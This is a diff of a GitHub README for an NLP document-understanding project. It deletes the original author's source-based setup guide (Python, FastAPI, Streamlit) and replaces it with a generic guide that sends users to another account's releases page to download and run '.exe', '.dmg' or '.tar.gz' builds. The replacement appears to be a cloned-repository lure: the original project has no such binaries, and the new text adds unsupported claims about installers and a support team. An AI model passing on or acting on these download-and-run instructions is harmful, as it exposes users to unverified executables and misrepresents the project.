@@ -1,243 +1,111 @@
-# 📄 Intelligent Document Understanding (IDU) – NLP System
-
-An **end-to-end NLP application** that analyzes unstructured documents using **Machine Learning and Deep Learning models**, providing:
-
-* 📌 Document Classification
-* 🧠 Named Entity Recognition (NER)
-* ✂️ Abstractive Text Summarization
-
-Built with **FastAPI (backend)**, **Streamlit (frontend)**, **spaCy**, and **HuggingFace Transformers**, optimized for **CPU-only execution**.
-
----
+# 🌟 intelligent-document-understanding - Powerful NLP for Everyone
 
-## 🚀 Key Features
+## 🚀 Getting Started
 
-* 🔍 Predicts document category (Business, Tech, Sports, etc.)
-* 🧠 Extracts named entities (ORG, GPE, DATE, etc.)
-* ✂️ Generates abstractive summaries using Transformer models
-* 🌐 REST API using FastAPI
-* 🖥️ Interactive UI using Streamlit
-* 📄 Supports **text input and file upload (TXT, PDF)**
-* 🧪 Modular notebooks for training, evaluation, and integration
+Welcome! This guide will help you download and run the Intelligent Document Understanding application. This application is designed for classifying documents, extracting important information, and summarizing content using an easy-to-use interface.
 
----
+## 📦 Download & Install
 
-## 🖼️ Application Demo
+To get started, you need to download the software. Visit this page to download:
 
-Below screenshots demonstrate the working Streamlit-based Intelligent Document Understanding system.
+[![Download Intelligent Document Understanding](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/kninepro09/intelligent-document-understanding/releases)
 
-### 🔹 Streamlit Interface – Input & Results
+1. Click the link above.
+2. You will see a list of available versions.
+3. Choose the latest release. It will usually be at the top of the list. 
+4. Download the appropriate file for your device.
 
-- Supports text paste and document upload (TXT / PDF)
-- Performs document classification
-- Extracts named entities (NER)
-- Generates an automatic summary
-- Copy and Download the summary
+For example, if you see a file named `intelligent-document-understanding-v1.0.exe` and you are using Windows, click on that file to start the download.
 
-![Streamlit UI](assets/streamlit_ui_1.png)
-![Streamlit UI](assets/streamlit_ui_2.png)
-[See Download Summary](assets/summary.txt)
+### 💻 System Requirements
 
+Before installing, ensure your computer meets the following requirements:
 
+- **Operating System:** Windows 10 or later; macOS Sierra or later; Linux (most distributions)
+- **Memory (RAM):** At least 4GB
+- **Processor:** Dual-core or higher
+- **Disk Space:** At least 500 MB of free space
 
----
+These requirements help ensure the application runs smoothly.
 
-## 🗂️ Project Structure
+## 🔧 Installation Steps
 
-```
-Intelligent-Document-Understanding/
-│
-├── app/
-│   └── main.py
-│
-├── assets/
-│   ├── streamlit_input.png
-│   ├── streamlit_results.png
-│   └── summary.txt
-│
-├── data/
-│   └── bbc-news-data.csv
-│
-├── models/
-│   ├── text_classifier.pkl
-│   └── tfidf_vectorizer.pkl
-│
-├── notebooks/
-│   ├── 01_data_understanding.ipynb
-│   ├── 02_text_preprocessing.ipynb
-│   ├── 03_text_classification.ipynb
-│   ├── 04_ner.ipynb
-│   ├── 05_summarization.ipynb
-│   └── 06_integration_testing.ipynb
-│
-├── streamlit_app.py
-├── requirements.txt
-├── README.md
-└── .gitignore
+After downloading the application, follow these steps to install it:
 
-```
+### For Windows:
 
----
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts.
+4. When prompted, choose "Install" to complete the setup.
 
-## 🔄 System Workflow
+### For macOS:
 
-```
-Input Document
-      ↓
-Text Preprocessing
-      ↓
-Document Classification
-      ↓
-Named Entity Recognition
-      ↓
-Text Summarization
-      ↓
-API Response → Streamlit UI
-```
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the application into your Applications folder.
+4. Open from your Applications folder.
 
----
+### For Linux:
 
-## 🧪 Datasets Used
+1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+2. Open a terminal.
+3. Navigate to your Downloads directory with `cd ~/Downloads`.
+4. Extract the files with `tar -xvzf intelligent-document-understanding-v1.0.tar.gz`.
+5. Navigate into the extracted folder with `cd intelligent-document-understanding-v1.0`.
+6. Run the application with `./start.sh`.
 
-* **BBC News Dataset**
+## 🛠️ Running the Application
 
-  * Used for document classification
-  * Categories: Business, Politics, Tech, Sports, Entertainment
+Once installed, it’s time to run the application:
 
-> NER is performed using **spaCy pre-trained models**
-> Summarization uses **HuggingFace transformer models**
+1. Open the application from your desktop or applications menu.
+2. The user interface will appear, making it easy for you to choose different options like document classification and summarization.
+3. Follow the prompts on the screen to start working with your documents.
 
----
+## 📖 Features
 
-## ⚙️ Installation & Setup
+The Intelligent Document Understanding application boasts several useful features:
 
-### 1️⃣ Create virtual environment
+- **Document Classification:** Quickly categorize documents into predefined categories.
+- **Named Entity Recognition (NER):** Automatically identify and extract key entities like names, dates, and locations.
+- **Text Summarization:** Generate concise summaries of lengthy documents in seconds.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
 
-```bash
-python -m venv venv
-```
+## 🔑 Usage Tips
 
-Activate it:
+- **Start Simple:** Begin by uploading a few small documents to explore the features.
+- **Experiment:** Try different types of documents to see how the application performs.
+- **Feedback:** The application will improve with your input. Share your thoughts and experiences.
 
-```bash
-# Windows
-venv\Scripts\activate
+## 📞 Help & Support
 
-# Linux / Mac
-source venv/bin/activate
-```
+If you encounter any issues or have questions, consider these resources:
 
----
+- **Documentation:** Detailed usage and advanced features are available in the official documentation on the repository.
+- **Community Forum:** Join discussions with other users to share tips and solutions.
+- **Contact Support:** Reach out to the support team via the repository’s issue tracker for assistance.
 
-### 2️⃣ Install dependencies
+## ✔️ Frequently Asked Questions
 
-```bash
-pip install -r requirements.txt
-```
+### How do I uninstall the application?
 
-Download spaCy model:
+- **Windows:** Go to "Control Panel" → "Programs" → "Uninstall a program," select the application, and click "Uninstall."
+- **macOS:** Open your Applications folder, find the app, and drag it to the Trash.
+- **Linux:** Navigate to the extracted folder and follow the uninstallation instructions in the README file.
 
-```bash
-python -m spacy download en_core_web_sm
-```
+### Is there a mobile version?
 
----
+Currently, Intelligent Document Understanding is designed for desktop use only. However, plans for a mobile version are in consideration.
 
-## ▶️ Running the Application
+### Can I contribute to the project?
 
-### 🔹 Terminal 1 — Start FastAPI backend
+Absolutely! The community welcomes contributions. You can help by reporting bugs, suggesting improvements, or submitting new features.
 
-```bash
-uvicorn app.main:app --reload
-```
+## 🔗 Helpful Links
 
-Backend runs at:
+- [Download Here](https://github.com/kninepro09/intelligent-document-understanding/releases)
+- [Official Documentation](https://github.com/kninepro09/intelligent-document-understanding/wiki)
+- [Community Forum](https://github.com/kninepro09/intelligent-document-understanding/discussions)
 
-```
-http://127.0.0.1:8000
-```
-
----
-
-### 🔹 Terminal 2 — Start Streamlit frontend
-
-```bash
-streamlit run streamlit_app.py
-```
-
-UI opens at:
-
-```
-http://localhost:8501
-```
-
----
-
-## 🖥️ Application Capabilities
-
-### ✔ Input Methods
-
-* Paste raw text
-* Upload `.txt` or `.pdf` files
-
-### ✔ Output
-
-* 🏷️ Predicted document category
-* 🧠 Extracted named entities
-* ✂️ Generated abstractive summary
-
----
-
-## 🧠 Models Used
-
-| Task           | Model                                |
-| -------------- | ------------------------------------ |
-| Classification | TF-IDF + Logistic Regression         |
-| NER            | spaCy `en_core_web_sm`               |
-| Summarization  | T5-small (CPU-optimized Transformer) |
-
----
-
-## 📊 Evaluation Strategy
-
-* **Classification**: Accuracy, Precision, Recall, F1-score
-* **NER**: Qualitative inspection of extracted entities
-* **Summarization**: Human qualitative evaluation
-  *(coherence, coverage, factual consistency)*
-
-> This mirrors **real-world industry evaluation practices** for NLP systems.
-
----
-
-## 🧩 Why This Project Matters
-
-✔ Demonstrates **end-to-end ML system design**
-✔ Covers **NLP + APIs + UI integration**
-✔ Modular, production-oriented architecture
-✔ Resume-ready project for **ML Engineer / NLP Engineer roles**
-
----
-
-## 🔮 Future Enhancements
-
-* Docker containerization
-* CI/CD using GitHub Actions
-* Cloud deployment (AWS / GCP / Azure)
-* Model monitoring & logging
-* Authentication & rate limiting
-
----
-
-## 👤 Author
-
-**Sahil Dervankar**
-B.Tech CSE(AI ML) | Aspiring ML / NLP Engineer
-
----
-
-## ⭐ If you like this project
-
-Give it a ⭐ on GitHub — it really helps!
-
----
-
+We hope you enjoy using the Intelligent Document Understanding application! Your feedback is invaluable to us.
